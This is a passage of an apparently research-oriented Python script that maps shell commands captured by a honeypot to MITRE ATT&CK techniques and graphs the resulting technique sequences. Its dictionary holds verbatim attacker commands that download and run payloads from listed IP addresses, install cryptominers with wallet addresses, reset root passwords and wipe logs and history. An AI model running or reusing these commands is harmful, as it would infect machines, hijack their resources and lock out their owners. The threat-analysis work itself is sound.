 'cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /; wget http://109.104.151.10/mtr.sh; busybox http://109.104.151.10/mtr.sh; curl -O http://109.104.151.10/mtr.sh; chmod +x mtr.sh; sh mtr.sh; rm -rf mtr.sh; tftp 109.104.151.10 -c get mtr1.sh; chmod 777 mtr1.sh; sh mtr1.sh; tftp -r mtr2.sh -g 109.104.151.10; chmod +x mtr2.sh; sh mtr2.sh; rm -rf *.sh; history -c':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1027 Obfuscated Files or Information" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cd /tmp || cd /var || cd /dev || cd /etc':
["T1083 File and Directory Discovery"],
 'cat /bin/ls|more':
["T1083 File and Directory Discovery"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://190.123.45.34/Y91/x86; chmod 777 x86; sh x86;rm -rf *':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'uname -a; cd /tmp ;curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 49UVbUeeWjV824vMb8z41M9BqLMxQSkz41pP76CFtkSuKfTwhRWw5MWE13rdB5uxerbnE8Rj2h2nvGAfEPuApn9bGNUV4UJ':
["T1087 Account Discovery" ,"T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information"],
 'cat /bin/sh || cat /bin/busybox || cat /bin/bash':
["T1083 File and Directory Discovery"],
 'yum install wget -y; apt install wget -y; cd /tmp/; rm -rf x86_64; rm -rf x86; wget http://2.56.59.225/x86_64; chmod 777 x86_64; ./x86_64 x86':
["T1059 Command and Scripting Interpreter","T1083 File and Directory Discovery","T1070 Indicator Removal" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter"],
 'cd /tmp ; wget http://51.210.71.115/ok.sh ; sh ok.sh ; rm -rf ok.sh ; curl -O http://51.210.71.115/ok.sh ; sh ok.sh ; rm -rf ok.sh ; history -c':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'apt update -y; apt install curl -y; cat /etc/issue; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa;timeout 10 top':
["T1059 Command and Scripting Interpreter","T1082 System Information Discovery" ,"T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter","T1027 Obfuscated Files or Information" ,"T1424 Process Discovery"],
 'cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://104.168.52.153/Ace.sh; chmod 777 Ace.sh; sh Ace.sh; tftp 104.168.52.153 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.168.52.153; chmod 777 tftp2.sh; sh tftp2.sh; rm -f tftp*.sh Ace.sh':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cd /tmp;rm -rf ur0a.sh;wget http://206.81.26.46/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;sh ur0a.sh;rm -rf ur0a.sh;cd;history -c;':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'wget http://31.44.185.235/s -O- |sh':
["T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter"],
 'cat $SHELL || while read i; do echo $i; done < $SHELL || dd if=$SHELL bs=22 count=1':
["T1005 Data from Local System", "T1059 Command and Scripting Interpreter"],
 'wget http://2.58.149.116/ssh/f -O- | sh; curl http://2.58.149.116/ssh/f | sh':
["T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.152.39.162/bins/x86; curl -O http://107.152.39.162/bins/x86;cat x86 >awoo;chmod +x *;./awoo Zeus.AutoRoot; >/var/log/lastlog; >/var/log/wtmp; >/var/log/btmp; history -c':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1098 Account Manipulation","T1070 Indicator Removal"],
 'rm -rf *; cd /tmp; rm -rf *; pkill xmrig; echo -e "xoxox0\\nxoxox0" | passwd; wget http://212.192.241.125/pedalcheta/cutie.x86_64; curl -O http://212.192.241.125/pedalcheta/cutie.x86_64; chmod 777 cutie.x86_64; ./cutie.x86_64 x86.nday; rm -rf cutie.*':
["T1070 Indicator Removal" ,"T1083 File and Directory Discovery","T1489 Service Stop" ,"T1531 Account Access Removal","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'echo "Z""IGAZAGA148""8"\n cat /dev/stdin | sh\n #!/usr/bin/sh\n #timeout=30\n killSTDIN() {\n processID=$(ps -u | grep -v \'grep\' | grep cat | grep \'/dev/stdin\' | head -n 1 | awk -F \' \' \'{ print $2 }\');\n ps -u | grep -v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }\n $(kill -9 $processID);\n kill -9 $processID\n }\n endScript() {\n echo "K""G""B""_CLOSE";\n $(exec 1>&-);\n exec 1 >& -\n killSTDIN;\n }\n start(){\n startResult=$(echo "[""[""[");\n echo [[[\n stopResult=$(echo "]""]""]");\n echo ]]]\n cmd=$(uname -a);\n uname -a\n echo $startResult$cmd$stopResult;\n }\n start;\n endScript;\n cat /dev/stdin | sh\n #!/usr/bin/sh\n #timeout=30\n killSTDIN() {\n processID=$(ps -u | grep -v \'grep\' | grep cat | grep \'/dev/stdin\' | head -n 1 | awk -F \' \' \'{ print $2 }\');\n ps -u | grep -v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }\n $(kill -9 $processID);\n kill -9 $processID\n }\n endScript() {\n echo "K""G""B""_CLOSE";\n $(exec 1>&-);\n exec 1 >& -\n killSTDIN;\n }\n start(){\n startResult=$(echo "[""[""[");\n echo [[[\n stopResult=$(echo "]""]""]");\n echo ]]]\n cmd=$(id);\n id\n echo $startResult$cmd$stopResult;\n }\n start;\n endScript;\n cat /dev/stdin | sh\n #!/usr/bin/sh\n #timeout=20\n killSTDIN() {\n processID=$(ps -u | grep -v \'grep\' | grep cat | grep \'/dev/stdin\' | head -n 1 | awk -F \' \' \'{ print $2 }\');\n ps -u | grep -v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }\n $(kill -9 $processID);\n kill -9 $processID\n }\n endScript() {\n echo "K""G""B""_CLOSE";\n $(exec 1>&-);\n exec 1 >& -\n killSTDIN;\n }\n start(){\n startResult=$(echo "[""[""[");\n echo [[[\n stopResult=$(echo "]""]""]");\n echo ]]]\n cmd=\'N/A\';\n if [ -f $(which uptime) ]; then\n which uptime\n cmd=$(uptime);\n uptime\n fi\n echo $startResult$cmd$stopResult;\n }\n start;':
["T1059 Command and Scripting Interpreter","T1083 File and Directory Discovery","T1424 Process Discovery","T1489 Service Stop" ,"T1087 Account Discovery" ,"T1124 System Time Discovery"],
 "while [ -d /proc/$PPID ]; do sleep 1;head -v -n 8 /proc/meminfo; head -v -n 2 /proc/stat /proc/version /proc/uptime /proc/loadavg /proc/sys/fs/file-nr /proc/sys/kernel/hostname; tail -v -n 16 /proc/net/dev;echo '==> /proc/df <==';df;echo '==> /proc/who <==';who;echo '==> /proc/end <==';echo '##Moba##'; done":
["T1059 Command and Scripting Interpreter","T1424 Process Discovery","T1083 File and Directory Discovery" ,"T1124 System Time Discovery","T1424 Process Discovery","T1087 Account Discovery"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.144.225.246/shell; chmod +x shell; ./shell; rm -rf *':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.58.203/ssh || curl -o ssh 209.141.58.203/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd;./krane oracle':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.98.173/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 159.203.98.173 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cd /tmp ; cd /home/$USER ; cd /var/run ; cd /mnt ; cd /root ; cd /':
["T1083 File and Directory Discovery"],
 'cat /proc/mounts;busybox cat /proc/mounts':
["T1083 File and Directory Discovery", "T1059 Command and Scripting Interpreter"],
 'echo "ZIGAZAGA1488"\ncat /dev/stdin | sh\n#!/usr/bin/sh\n#timeout=30\nkillSTDIN() {\nprocessID=$(ps -u | grep -v \'grep\' | grep cat | grep \'/dev/stdin\' | head -n 1 | awk -F \' \' \'{ print $2 }\');\nps -u | grep -v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }\n$(kill -9 $processID);\nkill -9 $processID\n}\nendScript() {\necho "KGB_CLOSE";\n$(exec 1>&-);\nexec 1 >& -\nkillSTDIN;\n}\nstart(){\nstartResult=$(echo "[[["\necho [[[stopResult=$(echo "]]]")\necho ]]]\ncmd=\'N/A\';\nif [ -f $(which uptime) ]; then\nwhich uptime\ncmd=$(uptime);\nuptime\nfi\necho $startResult$cmd$stopResult;\n}\nstart;\nendScript;\ncat /dev/stdin | sh\n#!/usr/bin/sh\n#timeout=30\nkillSTDIN() {\nprocessID=$(ps -u | grep -v \'grep\' | grep cat | grep \'/dev/stdin\' | head -n 1 | awk -F \' \' \'{ print $2 }\');\nps -u | grep -v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }\n$(kill -9 $processID);\nkill -9 $processID\n}\nendScript() {\necho "KGB_CLOSE";\n$(exec 1>&-);\nexec 1 >& -\nkillSTDIN;\n}\nstart(){\nstartResult=$(echo "[[["\necho [[[stopResult=$(echo "]]]")\necho ]]]\ncmd=$(id);\nid\necho $startResult$cmd$stopResult;\n}\nstart;\nendScript;\ncat /dev/stdin | sh\n#!/usr/bin/sh\n#timeout=20\nkillSTDIN() {\nprocessID=$(ps -u | grep-v \'grep\' | grep cat | grep \'/dev/stdin\' | head -n 1 | awk -F \' \' \'{ print $2 }\');\nps -u | grep-v grep | grep cat | grep /dev/stdin | head -n 1 | awk -F   { print $2 }\n$(kill -9 $processID);\nkill -9 $processID\n}\nendScript() {\necho "KGB_CLOSE";\n$(exec 1>&-);\nexec 1 >& -\nkillSTDIN;\n}\nstart(){\nstartResult=$(echo "[[["\necho [[[stopResult=$(echo "]]]")\necho ]]]\ncmd=\'N/A\';\nif [ -f $(which uptime) ]; then\nwhich uptime\ncmd=$(uptime);\nuptime\nfi\necho $startResult$cmd$stopResult;\n}\nstart;\n':
["T1059 Command and Scripting Interpreter","T1083 File and Directory Discovery","T1424 Process Discovery","T1489 Service Stop" ,"T1087 Account Discovery" ,"T1124 System Time Discovery"],
 'ls /home; ps aux; /bin/busybox gay; echo -en "\\x6d\\x69\\x6e\\x65\\x72\\x77\\x6f\\x72\\x64"':
["T1083 File and Directory Discovery", "T1059 Command and Scripting Interpreter","T1027 Obfuscated Files or Information" ,"T1059 Command and Scripting Interpreter"],
 'uname -a ; lscpu':
["T1087 Account Discovery" ,"T1082 System Information Discovery"],
 'curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45dNkjTQGgT77r9AEMyHdCGan5tpuekXaHFhFW99dQ8hUS35oZQEYXddFE52jxVdfUNrAD4ZyZ44BgHfgk5SjHdoLjGdJnQ':
["T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information", "T1059 Command and Scripting Interpreter"],
 'echo -e "!@#$%^&*()\\nXJ53qXwudUUo\\nXJ53qXwudUUo"|passwd|bash':
["T1531 Account Access Removal","T1059 Command and Scripting Interpreter"],
 'echo "!@#$%^&*()\\nXJ53qXwudUUo\\nXJ53qXwudUUo\\n"|passwd':
["T1531 Account Access Removal"],
 'chmod +x ./.3232227691811897618/xinetd;nohup ./.3232227691811897618/xinetd  &':
["T1222 File and Directory Permissions Modification" ,"T1053 Scheduled Task/Job","T1059 Command and Scripting Interpreter"],
 "cat /proc/cpuinfo|grep name|cut -f2 -d':'|uniq -c ; uname -a":
["T1082 System Information Discovery" ,"T1087 Account Discovery" ],
 'cd /tmp; wget http://31.44.185.235/unknown -O- >.f; chmod 777 .f; ./.f ssh.unknown':
["T1082 System Information Discovery" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'dd bs=52 count=1 if=/bin/ls || cat /bin/ls || while read i; do echo $i; done < /bin/ls || while read i; do echo $i; done < /bin/busybox':
["T1005 Data from Local System", "T1059 Command and Scripting Interpreter"],
 "echo -ne '\\x7F\\x45\\x4C\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x11\\x65\\x20\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x07\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00'>./catbpnhz":
["T1059 Command and Scripting Interpreter","T1027 Obfuscated Files or Information" ],
 'cd //; wget http://2.58.149.116/spc -O- > .f; ./.f s.spc; >.f':
["T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter"],
 'cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai':
["T1083 File and Directory Discovery" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal" ],
 'rm -rf nig.sh; rm -rf miori.*; wget http://2.56.59.225/nig.sh || curl -O http://2.56.59.225/nig.sh || tftp 2.56.59.225 -c get nig.sh || tftp -g -r nig.sh 2.56.59.225; chmod 777 nig.sh;./nig.sh ssh; rm -rf nig.sh':
["T1070 Indicator Removal" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 "uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr":
["T1087 Account Discovery" ,"T1120 Peripheral Device Discovery","T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information", "T1059 Command and Scripting Interpreter"],
 '>.s; cp .s .i':
["T1059 Command and Scripting Interpreter"],
 './.s>.i; chmod 777 .i; ./.i; rm .s; exit':
["T1059 Command and Scripting Interpreter","T1655 Masquerading","T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'wget http://2.58.149.116/spc -O- > ntpclient; chmod 777 ntpclient; ./ntpclient test.wget.spc; curl http://2.58.149.116/spc > ntpclient; chmod 777 ntpclient; ./ntpclient test.curl.spc':
["T1105 Ingress Tool Transfer" ,"T1655 Masquerading", "T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter"],
 'echo -e "[n0rd574r]\\niHqZPXXMXApI\\niHqZPXXMXApI"|passwd|bash':
["T1531 Account Access Removal","T1059 Command and Scripting Interpreter"],
 'echo "[n0rd574r]\\niHqZPXXMXApI\\niHqZPXXMXApI\\n"|passwd':
["T1531 Account Access Removal","T1059 Command and Scripting Interpreter"],
 'rm .s; wget http://2.225.20.46:40746/.i; chmod 777 .i; ./.i; exit':
 ["T1070 Indicator Removal" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter"]
}
def remove_duplicate_subsequences(arr):
    i = 0
    while i < len(arr):
        sub_seq = [arr[i]]
        j = i + 1
        while j < len(arr):
            # If an element equal to the current one is found, append the subsequence formed by it and its following elements to sub_seq
            if arr[j] == sub_seq[0] and arr[j:j+len(sub_seq)] == sub_seq:
                sub_seq.append(arr[j])
                j += len(sub_seq)
            else:
                j += 1
        # Delete every occurrence of sub_seq from arr
        while sub_seq in arr:
            start = arr.index(sub_seq[0])
            del arr[start:start+len(sub_seq)]
        # Add the first occurrence of sub_seq back into arr
        arr.insert(i, sub_seq)
        i += 1
    return arr


# Get the list of compound_commands_attck keys and remap them in order
attck_keys = list(compound_commands_attck.keys())
compound_pattern_mapped_attck={}
for i, key in enumerate(compound_commands_dict):
    compound_pattern_mapped_attck[" ".join(ast.literal_eval(key))] = compound_commands_attck[attck_keys[i]]


attck_session= {}
index=0
session_tech= {}

error_comd_pattern = []
for session in session_dict:
    session_tech[list(session_dict[session].keys())[0]]={}
    session_list=ast.literal_eval(session)
    # Get the technique flow corresponding to the session
    t=[]
    tech=[]

    for comd_pattern in session_list:
        # complex command
        if  re.search(r'[;|&><()]', comd_pattern):
        # Split the command into words using a regular expression
            try:
                tech+=compound_pattern_mapped_attck[comd_pattern]
                session_tech[list(session_dict[session].keys())[0]][comd_pattern]= compound_pattern_mapped_attck[comd_pattern]
            except:
                error_comd_pattern.append(comd_pattern)

        # simple command
        else:
            if comd_pattern[:2]=="./":
                comd_pattern="./"
            for key, value in simple_commands_attck.items():
                if comd_pattern in value:
                    tech.append(key)
                    session_tech[list(session_dict[session].keys())[0]][comd_pattern]= key
                    break
    # Remove duplicate and consecutive techniques from tech

    filtered_tech = [tech[0]]  # list holding the result

    for cmd in tech[1:]:
        if cmd != filtered_tech[-1]:  # if the current string differs from the last item in the result list, append it
            filtered_tech.append(cmd)
    tech=filtered_tech
    print(tech)

    # tech=remove_duplicate_subsequences(tech)
    #
    # print(tech)

    print("*"*20)
    # Create a list storing the tech list and its occurrence count
    tech=tuple(filtered_tech)
    if tech not in attck_session:
        attck_session[tech]= len(session_dict[session])
    else:
        attck_session[tech] = attck_session[tech]+ len(session_dict[session])
print(attck_session)
print("*"*20+"session_tech"+"*"*20)
print(session_tech)
# converted_dict = {str(k): v for k, v in attck_session.items()}
#
# with open('../data/session-ATT&CK.json', "w", encoding='utf-8') as file:
#     json.dump(converted_dict, file, indent=4)

import networkx as nx
import matplotlib.pyplot as plt
from collections import defaultdict
import matplotlib.gridspec as gridspec
import numpy as np

def adjust_labels_pos(edge_labels_pos, labels, min_distance=0.1, adjust_rate=0.01):
    # Create a new position dict, using a deep copy to avoid modifying the original position dict
    pos = edge_labels_pos.copy()

    # Convert all label positions and label sizes into numpy arrays
    positions = np.array(list(pos.values()))
    sizes = np.array([np.array([len(label), len(label)]) * adjust_rate for label in labels.values()])

    # Loop until none of the labels overlap
    while True:
        # Compute the distances between all labels
        deltas = positions[:, None, :] - positions[None, :, :]
        distances = np.sqrt((deltas ** 2).sum(axis=-1))

        # Check whether any labels overlap
        overlaps = distances < (sizes[:, None, :] + sizes[None, :, :]).mean(axis=-1)
        if not overlaps.any():
            break

        # For each overlapping label, move it slightly away from the other labels
        for i, overlap in enumerate(overlaps):
            if overlap.any():
                positions[i] += deltas[i].sum(axis=0) * adjust_rate

    # Convert the adjusted positions back into dict form
    for edge, position in zip(pos.keys(), positions):
        pos[edge] = position.tolist()

    return pos

# Create a directed graph
G = nx.DiGraph()
# Extract the mapping between technique IDs and full names, and add nodes and edges to the graph
id_fullname_mapping = {}
edge_weights = defaultdict(int)
node_weights = defaultdict(int)  # use defaultdict to auto-initialize the weight of new nodes
for key, value in attck_session.items():
    for i in range(len(key) - 1):
        #id1, id2 = key[i].split()[0], key[i+1].split()[0]
        id1, id2 = key[i], key[i + 1]
        id_fullname_mapping[id1] = key[i]
        id_fullname_mapping[id2] = key[i+1]
        edge_weights[(id1, id2)] += value
for key, value in attck_session.items():
    for i in range(len(key) ):
        #id=key[i].split()[0]
        id = key[i]
        node_weights[id] += value  # increase the node's weight
print(node_weights)
print (edge_weights)
# Add nodes and edges to the graph
G.add_nodes_from(id_fullname_mapping.keys())
G.add_weighted_edges_from((k[0], k[1], v) for k, v in edge_weights.items())

# Compute the total weight of edges between any two nodes
total_edge_weight = sum(edge_weights.values())

# Specify the positions of certain nodes

column_nodes1 = ['T1082', 'T1083', 'T1087', 'T1057', 'T1518', 'T1016', 'T1424', 'T1124', 'T1120']
column_nodes2 = ["T1059","T1531","T1005","T1222","T1027","T1105"]
column_nodes3 = ["T1474","T1098","T1070","T1489","T1548","T1655","T1053"]

pos = nx.spring_layout(G, seed=42)  # use the spring_layout layout algorithm
for i, node in enumerate(column_nodes1):
    pos[node] = (-1, i)  # place the specified node in the first (leftmost) column of the graph
for i, node in enumerate(column_nodes2):
    pos[node] = (0, i)  # place the specified node in the first (leftmost) column of the graph
for i, node in enumerate(column_nodes3):
    pos[node] = (1, i)  # place the specified node in the first (leftmost) column of the graph

# column_nodes1 = [ 'T1518', 'T1016',  'T1124']
# column_nodes2 = ['T1082',  'T1087', 'T1057', 'T1424', 'T1083','T1120']
# column_nodes3 = ["T1059","T1531","T1005","T1222","T1027","T1105"]
# column_nodes4 = ["T1474","T1098","T1070","T1489","T1548","T1655","T1053"]
# pos = nx.spring_layout(G, seed=42)  # use the spring_layout layout algorithm
# for i, node in enumerate(column_nodes1):
#     pos[node] = (-1, i)  # place the specified node in the first (leftmost) column of the graph
# for i, node in enumerate(column_nodes2):
#     pos[node] = (0, i)  # place the specified node in the first (leftmost) column of the graph
# for i, node in enumerate(column_nodes3):
#     pos[node] = (1, i)  # place the specified node in the first (leftmost) column of the graph
# for i, node in enumerate(column_nodes4):
#     pos[node] = (2, i)  # place the specified node in the first (leftmost) column of the graph
# Create a new position dict to store the label positions
edge_labels_pos = {}
# Compute the midpoint of each edge and offset it slightly
for edge in G.edges():
    start_pos = pos[edge[0]]
    end_pos = pos[edge[1]]
    edge_labels_pos[edge] = [(start_pos[0] + end_pos[0]) / 2, (start_pos[1] + end_pos[1]) / 2 + 0.1]

# Create a figure with two subplots
fig = plt.figure(figsize=(15, 10))
gs = gridspec.GridSpec(1, 2, width_ratios=[3, 1])


# Draw the network graph on the first subplot
ax0 = plt.subplot(gs[0])
ax0.set_title('Network')
nx.draw_networkx(G, pos, ax=ax0, node_color='blue')  # draw all nodes and edges
#nx.draw_networkx_edge_labels(G, pos, edge_labels=edge_weights, ax=ax0)  # add weights on the edges
#
threshold = 100  # only show edge weights greater than this threshold
edge_weights_to_show = {k: v for k, v in edge_weights.items() if v > threshold}
nx.draw_networkx_edge_labels(G, pos, edge_labels=edge_weights_to_show, ax=ax0)


# Draw the label bar on the second subplot
ax1 = plt.subplot(gs[1])
ax1.set_title('Label Bar')
ax1.axis('off')
label_text = '\n'.join(f'{id}: {fullname}, weight: {node_weights[id]}' for id, fullname in id_fullname_mapping.items())
label_text += f'\n\nTotal edge weight: {total_edge_weight}'
ax1.text(0.5, 0.5, label_text, horizontalalignment='left', verticalalignment='center', transform=ax1.transAxes)

# Show the figure
plt.tight_layout()
plt.show()
1